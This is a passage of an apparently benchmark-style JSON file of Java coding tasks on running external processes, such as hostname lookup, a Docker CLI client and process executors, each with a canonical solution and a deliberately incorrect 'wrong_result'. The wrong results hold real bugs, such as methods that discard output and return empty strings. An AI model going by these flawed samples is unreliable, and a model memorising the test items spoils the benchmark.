    "wrong_result": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport android.util.Log;\n\npublic class ShellCommand {\n    private Runtime rt;\n    private String[] command;\n    private String tag;\n    private Process process;\n    private BufferedReader stdout;\n    private String error;\n    private int exitval;\n\n    public ShellCommand(String[] command) {\n        this.command = command;\n        this.tag = \"ShellCommand\";\n        rt = Runtime.getRuntime();\n    }\n\n    public ShellCommand(String[] command, String tag) {\n        this.command = command;\n        this.tag = tag;\n        rt = Runtime.getRuntime();\n    }\n\n    public void start(boolean waitForExit) {\n        try {\n            process = rt.exec(command);\n            stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            Thread errorThread = new Thread(() -> {\n                try (BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                    String line;\n                    while ((line = errorReader.readLine()) != null) {\n                        error += line + \"\\n\";\n                    }\n                } catch (Exception e) {\n                    Log.e(tag, \"Error reading stderr: \" + e.getMessage());\n                }\n            });\n            errorThread.start();\n\n            if (waitForExit) {\n                process.waitFor();\n                exitval = process.exitValue();\n            }\n        } catch (Exception e) {\n            error = \"Error starting process: \" + e.getMessage();\n            Log.e(tag, \"Error starting process: \" + e.getMessage());\n        }\n    }\n\n    public void waitForExit() {\n        try {\n            process.waitFor();\n            exitval = process.exitValue();\n            String line;\n            while ((line = readStdoutBlocking()) != null) {\n                Log.d(tag, line);\n            }\n        } catch (Exception e) {\n            Log.e(tag, \"Error waiting for exit: \" + e.getMessage());\n        }\n    }\n\n    public void finish() {\n        if (process != null) {\n            try {\n                process.destroy();\n                if (stdout != null) {\n                    stdout.close();\n                }\n            } catch (Exception e) {\n                Log.e(tag, \"Error finishing process: \" + e.getMessage());\n            }\n        }\n    }\n\n    public boolean checkForExit() {\n        return process.isAlive();\n    }\n\n    public boolean stdoutAvailable() {\n        try {\n            return process.isAlive();\n        } catch (Exception e) {\n            Log.e(tag, \"Error checking stdout availability: \" + e.getMessage());\n            return false;\n        }\n    }\n\n    public String readStdoutBlocking() {\n        try {\n            return stdout.readLine();\n        } catch (Exception e) {\n            Log.e(tag, \"Error reading stdout: \" + e.getMessage());\n            return null;\n        }\n    }\n\n    public String readStdout() {\n        try {\n            return stdout.readLine();\n        } catch (Exception e) {\n            Log.e(tag, \"Error reading stdout: \" + e.getMessage());\n            return null;\n        }\n    }\n\n    public String getError() {\n        return error;\n    }\n\n    public int getExitval() {\n        return exitval;\n    }\n}"
  },
  {
    "Task_id": 289,
    "Instruction": "Task Description: Implement a utility class that provides methods to retrieve system information, specifically the hostname, in a cross-platform manner (supporting both Linux and Windows operating systems).\n\nClass Description: The SystemInfoUtil class contains static methods for obtaining system information. It handles platform-specific differences internally and provides a consistent interface for retrieving the hostname.\n\nMethods:\n\nMethod1: getHostName() -> String - Retrieves the hostname of the current system. On Linux systems, it uses the 'uname -n' command, while on Windows it first tries the COMPUTERNAME environment variable and falls back to the 'hostname' command if needed. Returns an empty string if the hostname cannot be determined.\n\nMethod2: getUname(String param) -> String - A helper method that executes the 'uname' command with the specified parameter and returns its output. Primarily used internally by getHostName() for Linux systems. Returns an empty string if the command fails or times out.\n\nInput Parameters:\n- param (String): The parameter to pass to the uname command (e.g., \"-n\" for nodename)\n\nOutput:\n- String: The requested system information (hostname or uname output), or empty string if retrieval fails",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.TimeUnit;\n\npublic static String getHostName()\n{\n    String hostname = \"\";\n\n    if (Platform.isLinux())\n    {\n        hostname = getUname(\"-n\");\n    }\n    else if (Platform.isWindows())\n    {\n        hostname = System.getenv().get(\"COMPUTERNAME\");\n        try\n        {\n            Process process = new ProcessBuilder(\"hostname\").start();\n            process.waitFor(1, TimeUnit.SECONDS);\n            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            hostname = br.readLine().trim();\n        }\n        catch (IOException | InterruptedException ignored)\n        {\n        }\n    }\n    return hostname;\n}\n\npublic static String getUname(String param)\n{\n    String uname = \"\";\n    try\n    {\n        Process process = new ProcessBuilder(\"uname\", param).start();\n        process.waitFor(1, TimeUnit.SECONDS);\n        BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        uname = br.readLine().trim();\n    }\n    catch (IOException | InterruptedException ignored)\n    {\n    }\n    return uname;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class SystemInfoUtil {\n    public static String getHostName() {\n        String os = System.getProperty(\"os.name\");\n        if (os.contains(\"Windows\")) {\n            String computerName = System.getenv(\"COMPUTERNAME\");\n            if (computerName != null && !computerName.isEmpty()) {\n                return computerName;\n            } else {\n                return executeCommand(\"hostname\");\n            }\n        } else {\n            return executeCommand(\"uname -n\");\n        }\n    }\n\n    private static String executeCommand(String command) {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(command.split(\" \"));\n            Process process = pb.start();\n            Future<String> future = Executors.newSingleThreadExecutor().submit(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                    StringBuilder output = new StringBuilder();\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        output.append(line);\n                    }\n                    int exitCode = process.waitFor();\n                    if (exitCode != 0) {\n                        return \"\";\n                    }\n                    return output.toString();\n                } catch (Exception e) {\n                    return \"\";\n                }\n            });\n            try {\n                return future.get(5, TimeUnit.SECONDS);\n            } catch (TimeoutException e) {\n                return \"\";\n            } catch (InterruptedException | ExecutionException e) {\n                return \"\";\n            }\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n\n    public static String getUname(String param) {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"uname\", param);\n            Process process = pb.start();\n            Future<String> future = Executors.newSingleThreadExecutor().submit(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                    StringBuilder output = new StringBuilder();\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        output.append(line);\n                    }\n                    int exitCode = process.waitFor();\n                    if (exitCode != 0) {\n                        return \"\";\n                    }\n                    return output.toString();\n                } catch (Exception e) {\n                    return \"\";\n                }\n            });\n            try {\n                return future.get(5, TimeUnit.SECONDS);\n            } catch (TimeoutException e) {\n                return \"\";\n            } catch (InterruptedException | ExecutionException e) {\n                return \"\";\n            }\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n}"
  },
  {
    "Task_id": 29,
    "Instruction": "Task Description: Implement a class for managing temporary port allocations using file locks to ensure exclusive access to ports during testing or other temporary usage scenarios.\n\nClass Description: The TemporaryPorts class provides a mechanism to acquire and manage temporary port allocations using file-based locks. It creates lock files in a specified directory to represent port allocations and ensures exclusive access through FileChannel locks.\n\nAttributes:\n- DEFAULT_LOCK_DIRECTORY: [Path] - Default directory path for storing port lock files (\"/tmp/helios-test/ports/\")\n- lockDirectory: [Path] - Custom directory path for storing port lock files\n- ports: [List<AllocatedPort>] - List of currently allocated ports\n\nMethods:\n- TemporaryPorts([Path lockDirectory]) -> [void] - Constructor that initializes the lock directory and creates it if it doesn't exist\n- tryAcquire([String name, int port]) -> [AllocatedPort] - Attempts to acquire a port lock, returns AllocatedPort if successful or null if port is already locked\n- lock([int port, String name]) -> [AllocatedPort] - Internal method that performs the actual port locking operation using FileChannel\n- AllocatedPort([int port, Path path, FileChannel file, FileLock lock]) -> [void] - Nested class constructor representing an allocated port\n- port() -> [int] - Returns the allocated port number\n- release() -> [void] - Releases the port lock, closes the file channel, and deletes the lock file",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport com.google.common.collect.Lists;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.channels.OverlappingFileLockException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.List;\nimport static java.nio.file.StandardOpenOption.CREATE;\nimport static java.nio.file.StandardOpenOption.WRITE;\nimport static java.nio.charset.StandardCharsets.UTF_8;\nimport static java.lang.String.format;\n\npublic class TemporaryPorts {\n\n  private static final Path DEFAULT_LOCK_DIRECTORY = Paths.get(\"/tmp/helios-test/ports/\");\n  private final Path lockDirectory;\n  private final List<AllocatedPort> ports = Lists.newArrayList();\n\n  public TemporaryPorts(final Path lockDirectory) {\n    this.lockDirectory = lockDirectory;\n    try {\n      Files.createDirectories(lockDirectory);\n    } catch (IOException e) {\n      throw new RuntimeException(e);\n    }\n  }\n\n  public AllocatedPort tryAcquire(final String name, final int port) {\n    final AllocatedPort allocatedPort = lock(port, name);\n    if (allocatedPort == null) {\n      return null;\n    }\n    ports.add(allocatedPort);\n    return allocatedPort;\n  }\n\n  private AllocatedPort lock(final int port, final String name) {\n    final Path path = lockDirectory.resolve(String.valueOf(port));\n    try {\n      final FileChannel file = FileChannel.open(path, CREATE, WRITE);\n      final FileLock lock = file.tryLock();\n      if (lock == null) {\n        return null;\n      }\n      file.write(ByteBuffer.wrap(format(\"%d %s%n\", port, name).getBytes(UTF_8)));\n      file.force(true);\n      return new AllocatedPort(port, path, file, lock);\n    } catch (OverlappingFileLockException e) {\n      return null;\n    } catch (IOException e) {\n      throw new RuntimeException(e);\n    }\n  }\n\n  public static class AllocatedPort {\n    private final int port;\n    private final Path path;\n    private final FileChannel file;\n    private final FileLock lock;\n\n    private AllocatedPort(final int port, final Path path, FileChannel file, FileLock lock) {\n      this.port = port;\n      this.path = path;\n      this.file = file;\n      this.lock = lock;\n    }\n\n    public int port() {\n      return port;\n    }\n\n    public void release() {\n      try {\n        if (lock.isValid()) {\n          lock.release();\n        }\n        file.close();\n        Files.deleteIfExists(path);\n      } catch (IOException e) {\n        throw new RuntimeException(e);\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class TemporaryPorts {\n    private static final Path DEFAULT_LOCK_DIRECTORY = Path.of(\"/tmp/helios-test/ports/\");\n    private final Path lockDirectory;\n    private final List<AllocatedPort> ports = new ArrayList<>();\n\n    public TemporaryPorts(Path lockDirectory) {\n        this.lockDirectory = lockDirectory != null ? lockDirectory : DEFAULT_LOCK_DIRECTORY;\n        try {\n            Files.createDirectories(lockDirectory);\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    public AllocatedPort tryAcquire(String name, int port) {\n        Path lockFilePath = lockDirectory.resolve(port + \".lock\");\n        if (Files.exists(lockFilePath)) {\n            return null;\n        }\n        AllocatedPort allocatedPort = lock(port, name);\n        if (allocatedPort != null) {\n            ports.add(allocatedPort);\n        }\n        return allocatedPort;\n    }\n\n    private AllocatedPort lock(int port, String name) {\n        Path lockFilePath = lockDirectory.resolve(port + \".lock\");\n        try {\n            Files.createFile(lockFilePath);\n            FileChannel channel = FileChannel.open(lockFilePath, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            FileLock lock = channel.lock();\n            return new AllocatedPort(port, lockFilePath, channel, lock);\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    static class AllocatedPort {\n        private final int port;\n        private final Path path;\n        private final FileChannel file;\n        private final FileLock lock;\n\n        public AllocatedPort(int port, Path path, FileChannel file, FileLock lock) {\n            this.port = port;\n            this.path = path;\n            this.file = file;\n            this.lock = lock;\n        }\n\n        public int port() {\n            return port;\n        }\n\n        public void release() {\n            try {\n                lock.release();\n                file.close();\n                Files.delete(path);\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 290,
    "Instruction": "Task Description: Create a Java class that implements a Docker client using ProcessBuilder to interact with the Docker CLI, handling process execution, input/output streams, and error handling.\n\nClass Description: CliDockerClient is a Docker client implementation that uses ProcessBuilder to execute Docker CLI commands. It manages process creation, stream handling, and timeout control for Docker operations.\n\nAttributes:\n- processBuilderFactory: Function<List<String>, ProcessBuilder> - Factory function to create ProcessBuilder instances configured for Docker commands\n- DEFAULT_DOCKER_CLIENT: Path - Default path to the Docker executable\n- DOCKER_OUTPUT_TIMEOUT: Long - Timeout duration for Docker command execution (10 minutes)\n\nMethods:\n- CliDockerClient(Path, Map<String,String>) -> void - Constructor that initializes the client with Docker executable path and environment variables\n- CliDockerClient(Function<List<String>,ProcessBuilder>) -> void - Internal constructor accepting a ProcessBuilder factory function\n- defaultProcessBuilderFactory(String,ImmutableMap<String,String>) -> Function<List<String>,ProcessBuilder> - Creates default ProcessBuilder factory with Docker executable and environment\n- getStderrOutput(Process) -> String - Helper method to read error stream from a process\n- docker(String...) -> Process - Executes a Docker subcommand and returns the Process instance\n- info() -> DockerInfoDetails - Executes 'docker info' command and returns parsed information\n- fetchInfoDetails() -> DockerInfoDetails - Internal method to fetch and parse Docker info details",
    "Canonical_solution": "import com.fasterxml.jackson.annotation.JsonIgnoreProperties;\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.google.cloud.tools.jib.api.DescriptorDigest;\nimport com.google.cloud.tools.jib.api.DockerClient;\nimport com.google.cloud.tools.jib.api.DockerInfoDetails;\nimport com.google.cloud.tools.jib.api.ImageDetails;\nimport com.google.cloud.tools.jib.api.ImageReference;\nimport com.google.cloud.tools.jib.http.NotifyingOutputStream;\nimport com.google.cloud.tools.jib.image.ImageTarball;\nimport com.google.cloud.tools.jib.json.JsonTemplate;\nimport com.google.cloud.tools.jib.json.JsonTemplateMapper;\nimport com.google.common.collect.ImmutableMap;\nimport com.google.common.io.ByteStreams;\nimport com.google.common.io.CharStreams;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.security.DigestException;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport java.util.function.Consumer;\nimport java.util.function.Function;\n\npublic class CliDockerClient implements DockerClient {\n\n  public static final Path DEFAULT_DOCKER_CLIENT = Paths.get(\"docker\");\n  public static final Long DOCKER_OUTPUT_TIMEOUT = (long) 10 * 60 * 1000;\n\n  private final Function<List<String>, ProcessBuilder> processBuilderFactory;\n\n  public CliDockerClient(Path dockerExecutable, Map<String, String> dockerEnvironment) {\n    this(\n        defaultProcessBuilderFactory(\n            dockerExecutable.toString(), ImmutableMap.copyOf(dockerEnvironment)));\n  }\n\n  CliDockerClient(Function<List<String>, ProcessBuilder> processBuilderFactory) {\n    this.processBuilderFactory = processBuilderFactory;\n  }\n\n  private static Function<List<String>, ProcessBuilder> defaultProcessBuilderFactory(\n      String dockerExecutable, ImmutableMap<String, String> dockerEnvironment) {\n    return dockerSubCommand -> {\n      List<String> dockerCommand = new ArrayList<>(1 + dockerSubCommand.size());\n      dockerCommand.add(dockerExecutable);\n      dockerCommand.addAll(dockerSubCommand);\n\n      ProcessBuilder processBuilder = new ProcessBuilder(dockerCommand);\n      Map<String, String> environment = processBuilder.environment();\n      environment.putAll(dockerEnvironment);\n\n      return processBuilder;\n    };\n  }\n\n  private static String getStderrOutput(Process process) {\n    try (InputStreamReader stderr =\n        new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8)) {\n      return CharStreams.toString(stderr);\n    } catch (IOException ex) {\n      return \"unknown (failed to read error message from stderr due to \" + ex.getMessage() + \")\";\n    }\n  }\n\n  private Process docker(String... subCommand) throws IOException {\n    return processBuilderFactory.apply(Arrays.asList(subCommand)).start();\n  }\n\n  @Override\n  public DockerInfoDetails info() throws IOException, InterruptedException {\n    ExecutorService executor = Executors.newSingleThreadExecutor();\n    Future<DockerInfoDetails> readerFuture = executor.submit(this::fetchInfoDetails);\n    try {\n      DockerInfoDetails details = readerFuture.get(DOCKER_OUTPUT_TIMEOUT, TimeUnit.MILLISECONDS);\n      return details;\n    } catch (TimeoutException e) {\n      readerFuture.cancel(true);\n      throw new IOException(\"Timeout reached while waiting for 'docker info' output\");\n    } catch (ExecutionException e) {\n      throw new IOException(\"Failed to read output of 'docker info': \" + e.getMessage());\n    } finally {\n      executor.shutdownNow();\n    }\n  }\n\n  private DockerInfoDetails fetchInfoDetails() throws IOException, InterruptedException {\n    Process infoProcess = docker(\"info\", \"-f\", \"{{json .}}\");\n    InputStream inputStream = infoProcess.getInputStream();\n    if (infoProcess.waitFor() != 0) {\n      throw new IOException(\n          \"'docker info' command failed with error: \" + getStderrOutput(infoProcess));\n    }\n    return JsonTemplateMapper.readJson(inputStream, DockerInfoDetails.class);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "import java.io.*;\nimport java.nio.file.Path;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class CliDockerClient {\n    private final Function<List<String>, ProcessBuilder> processBuilderFactory;\n    private static final Path DEFAULT_DOCKER_CLIENT = Path.of(\"docker\");\n    private static final long DOCKER_OUTPUT_TIMEOUT = 600_000;\n\n    public CliDockerClient(Path dockerPath, Map<String, String> env) {\n        this.processBuilderFactory = defaultProcessBuilderFactory(dockerPath, env);\n    }\n\n    public CliDockerClient(Function<List<String>, ProcessBuilder> factory) {\n        this.processBuilderFactory = factory;\n    }\n\n    private Function<List<String>, ProcessBuilder> defaultProcessBuilderFactory(String dockerPath, ImmutableMap<String, String> env) {\n        return commands -> {\n            ProcessBuilder pb = new ProcessBuilder(dockerPath, commands);\n            pb.environment().putAll(env);\n            return pb;\n        };\n    }\n\n    private String getStderrOutput(Process process) throws IOException {\n        StringBuilder stderr = new StringBuilder();\n        try (InputStream errorStream = process.getErrorStream()) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = errorStream.read(buffer)) != -1) {\n                stderr.append(new String(buffer, 0, bytesRead));\n            }\n        }\n        return stderr.toString();\n    }\n\n    public Process docker(String... commands) throws IOException, InterruptedException {\n        ProcessBuilder pb = processBuilderFactory.apply(Arrays.asList(commands));\n        pb.redirectErrorStream(false);\n        Process process = pb.start();\n        ExecutorService executor = Executors.newSingleThreadExecutor();\n        Future<?> timeoutFuture = executor.submit(() -> {\n            try {\n                Thread.sleep(DOCKER_OUTPUT_TIMEOUT);\n                if (process.isAlive()) {\n                    process.destroy();\n                }\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        });\n        process.waitFor();\n        timeoutFuture.cancel(true);\n        executor.shutdown();\n        return process;\n    }\n\n    public DockerInfoDetails info() throws IOException, InterruptedException {\n        Process process = docker(\"info\");\n        String stderr = getStderrOutput(process);\n        return fetchInfoDetails(stderr);\n    }\n\n    private DockerInfoDetails fetchInfoDetails(String output) {\n        // Implementation to parse Docker info output into DockerInfoDetails\n        return new DockerInfoDetails();\n    }\n}"
  },
  {
    "Task_id": 291,
    "Instruction": "Task Description: Verify and ensure the Java Virtual Machine (JVM) is running on the first thread on macOS, relaunching the process if necessary with the correct arguments.\n\nFunction Description: This function checks if the JVM is running on the first thread on macOS, which is required for proper execution of certain applications. If not, it attempts to relaunch the process with the \"-XstartOnFirstThread\" argument. The function handles process creation, stream redirection, and output/error handling during the relaunch.\n\nInput: \n- args: String[] - Command-line arguments to be passed to the relaunched process (if needed)\n\nOutput: \n- boolean - Returns true if the JVM is already in a valid state (either not on macOS or already running on first thread), or false if a relaunch was attempted (the original process should exit in this case)",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.lang.management.ManagementFactory;\n\npublic static boolean verifyValidJVMState(String[] args){\n    if (SharedLibraryLoader.isMac){\n        if (\"1\".equals(System.getenv(\"JAVA_STARTED_ON_FIRST_THREAD_\" +\n                ManagementFactory.getRuntimeMXBean().getName().split(\"@\")[0]))) {\n            return true;\n        }\n\n        if (\"true\".equals(System.getProperty(\"shpdRelaunched\"))){\n            System.err.println(\"Error: Could not verify new process is running on the first thread. Trying to run the game anyway...\");\n            return true;\n        }\n\n        String sep = System.getProperty(\"file.separator\");\n\n        ArrayList<String> jvmArgs = new ArrayList<>();\n        jvmArgs.add(System.getProperty(\"java.home\") + sep + \"bin\" + sep + \"java\");\n        jvmArgs.add(\"-XstartOnFirstThread\");\n        jvmArgs.add(\"-DshpdRelaunched=true\");\n        jvmArgs.addAll(ManagementFactory.getRuntimeMXBean().getInputArguments());\n        jvmArgs.add(\"-cp\");\n        jvmArgs.add(System.getProperty(\"java.class.path\"));\n        jvmArgs.add(DesktopLauncher.class.getName());\n\n        System.err.println(\"Error: ShatteredPD must start on the first thread in order to work on macOS.\");\n        System.err.println(\"  To avoid this error, run the game with the \\\"-XstartOnFirstThread\\\" argument\");\n        System.err.println(\"  Now attempting to relaunch the game on the first thread automatically:\\n\");\n\n        try {\n            Process process = new ProcessBuilder(jvmArgs).redirectErrorStream(true).start();\n            BufferedReader out = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n\n            while ((line = out.readLine()) != null) {\n                if (line.toLowerCase().startsWith(\"error\")){\n                    System.err.println(line);\n                } else {\n                    System.out.println(line);\n                }\n            }\n\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        return false;\n    }\n\n    return true;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class JVMChecker {\n    public static boolean checkJVMFirstThread(String[] args) {\n        String prop = System.getProperty(\"sun.java.starting.on.first.thread\");\n        if (prop != null && Boolean.parseBoolean(prop)) {\n            return true;\n        } else {\n            try {\n                String[] newArgs = new String[args.length + 1];\n                newArgs[0] = \"-XstartOnFirstThread\";\n                System.arraycopy(args, 0, newArgs, 1, args.length);\n                ProcessBuilder pb = new ProcessBuilder(\"java\", newArgs);\n                pb.redirectErrorStream(true);\n                pb.start();\n                System.exit(0);\n            } catch (Exception e) {\n                e.printStackTrace();\n                System.exit(1);\n            }\n            return false;\n        }\n    }\n}"
  },
  {
    "Task_id": 292,
    "Instruction": "Task Description: Implement a utility class for executing external processes synchronously and asynchronously in Java, handling input/output streams properly to prevent deadlocks, and collecting process output.\n\nClass Description: A ProcessExecutor utility class that provides methods to run external processes either synchronously (blocking until completion) or asynchronously (returning immediately), while properly managing process streams and errors.\n\nMethods:\n\nMethod1: runWith(List<String> cmd) -> Collection<String> - Executes a command synchronously and returns its output as a collection of strings. Handles both stdout and stderr streams by draining them concurrently to prevent deadlocks. The method blocks until the process completes.\n\nMethod2: runAsync(String... cmd) -> Process - Executes a command asynchronously and returns the Process object immediately without waiting for completion. The caller is responsible for handling the process streams and termination.\n\nMethod3: InputStreamDrainer(InputStream, OutputStream) -> void - [Internal helper class] A thread class that continuously reads from an input stream and writes to an output stream until EOF is reached. Used internally by runWith() to drain process streams.",
    "Canonical_solution": "import java.io.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic static Collection<String> runWith(List<String> cmd) {\n    Collection<String> messages = new ArrayList<>();\n    try {\n        Process p = new ProcessBuilder(cmd).start();\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n\n        // drain streams, else we might lock up\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), baos);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), baos);\n\n        errDrainer.start();\n        outDrainer.start();\n\n        int err = p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n\n        messages.add(baos.toString());\n    } catch (IOException ex) {\n        return Collections.singleton(ex.getMessage());\n    } catch (InterruptedException ex) {\n        throw new IllegalStateException(ex);\n    }\n    return messages;\n}\n\npublic static Process runAsync(String... cmd) {\n    try {\n        return new ProcessBuilder(cmd).start();\n    } catch (IOException ex) {\n        throw new IllegalStateException(ex);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessExecutor {\n    private static class InputStreamDrainer implements Runnable {\n        private final InputStream inputStream;\n        private final OutputStream outputStream;\n\n        public InputStreamDrainer(InputStream inputStream, OutputStream outputStream) {\n            this.inputStream = inputStream;\n            this.outputStream = outputStream;\n        }\n\n        @Override\n        public void run() {\n            try {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = inputStream.read(buffer)) != -1) {\n                    outputStream.write(buffer, 0, bytesRead);\n                }\n            } catch (IOException e) {\n                // Handle exception silently\n            }\n        }\n    }\n\n    public java.util.Collection<String> runWith(java.util.List<String> cmd) {\n        try {\n            java.util.ProcessBuilder builder = new java.util.ProcessBuilder(cmd);\n            java.util.Process process = builder.start();\n\n            java.io.ByteArrayOutputStream stdout = new java.io.ByteArrayOutputStream();\n            java.io.ByteArrayOutputStream stderr = new java.io.ByteArrayOutputStream();\n\n            java.lang.Thread stdoutDrainer = new java.lang.Thread(new InputStreamDrainer(process.getInputStream(), stdout));\n            java.lang.Thread stderrDrainer = new java.lang.Thread(new InputStreamDrainer(process.getErrorStream(), stderr));\n\n            stdoutDrainer.start();\n            stderrDrainer.start();\n\n            int exitCode = process.waitFor();\n\n            String stdoutStr = new String(stdout.toByteArray());\n            String stderrStr = new String(stderr.toByteArray());\n\n            java.util.List<String> output = new java.util.ArrayList<>();\n            java.lang.String[] lines = stdoutStr.split(\"\\n\");\n            for (String line : lines) {\n                output.add(line);\n            }\n            java.lang.String[] errLines = stderrStr.split(\"\\n\");\n            for (String line : errLines) {\n                output.add(line);\n            }\n\n            return output;\n        } catch (java.lang.Exception e) {\n            throw new java.lang.RuntimeException(\"Error executing process\", e);\n        }\n    }\n\n    public java.util.Process runAsync(java.lang.String... cmd) {\n        try {\n            java.util.ProcessBuilder builder = new java.util.ProcessBuilder(cmd);\n            return builder.start();\n        } catch (java.lang.Exception e) {\n            throw new java.lang.RuntimeException(\"Error starting process\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 293,
    "Instruction": "Task Description: Create a utility class for executing external processes in Java, handling both command execution and process stream management.\n\nClass Description: A ProcessExecutor utility class that provides methods to execute system commands and external processes, capturing their output and error streams, with proper resource cleanup.\n\nMethods:\n\nMethod1: runCmd(String... cmd) -> String - Executes a command using ProcessBuilder, captures the output stream, and checks the exit status. Throws exceptions if the process fails.\nInput: cmd - Varargs parameter representing the command and its arguments\nOutput: String - The output from the process's standard output stream\n\nMethod2: runExec(String[] argv) -> String - Executes a command using Runtime.exec(), captures the output stream, and checks the exit status. Throws exceptions if the process fails.\nInput: argv - String array representing the command and its arguments\nOutput: String - The output from the process's standard output stream\n\nMethod3: processOutputStreamInThread(Process process) -> void - Helper method that reads and discards process output in a separate thread to prevent stream blocking.\nInput: process - The Process object whose output stream needs to be processed\nOutput: None (void)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\n\npublic static String runCmd(String... cmd) throws IOException, InterruptedException {\n    String output;\n    Process process = null;\n    try {\n        process = new ProcessBuilder(cmd).start();\n        output = StringUtil.readInputStream(process.getInputStream());\n        process.waitFor();\n        if (process.exitValue() != 0) {\n            System.err.println(String.format(\"%s Failed! Please check your signature file.\\n\", cmd[0]));\n            throw new RuntimeException(StringUtil.readInputStream(process.getErrorStream()));\n        }\n    } finally {\n        if (process != null) {\n            process.destroy();\n        }\n    }\n    return output;\n}\n\npublic static String runExec(String[] argv) throws IOException, InterruptedException {\n    Process process = null;\n    String output;\n    try {\n        process = Runtime.getRuntime().exec(argv);\n        output = StringUtil.readInputStream(process.getInputStream());\n        process.waitFor();\n        if (process.exitValue() != 0) {\n            System.err.println(String.format(\"%s Failed! Please check your signature file.\\n\", argv[0]));\n            throw new RuntimeException(StringUtil.readInputStream(process.getErrorStream()));\n        }\n    } finally {\n        if (process != null) {\n            process.destroy();\n        }\n    }\n    return output;\n}\n\nprivate static void processOutputStreamInThread(Process process) throws IOException {\n    InputStreamReader ir = new InputStreamReader(process.getInputStream());\n    LineNumberReader input = new LineNumberReader(ir);\n    while (input.readLine() != null) {\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessExecutor {\n    public String runCmd(String... cmd) throws IOException, InterruptedException {\n        ProcessBuilder pb = new ProcessBuilder(cmd);\n        Process process = pb.start();\n        processOutputStreamInThread(process);\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new RuntimeException(\"Command failed with exit code: \" + exitCode);\n        }\n        return \"\";\n    }\n\n    public String runExec(String[] argv) throws IOException, InterruptedException {\n        Process process = Runtime.getRuntime().exec(argv);\n        processOutputStreamInThread(process);\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new RuntimeException(\"Command failed with exit code: \" + exitCode);\n        }\n        return \"\";\n    }\n\n    public void processOutputStreamInThread(Process process) {\n        new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    // Discard the line\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n}"
  },
  {
    "Task_id": 295,
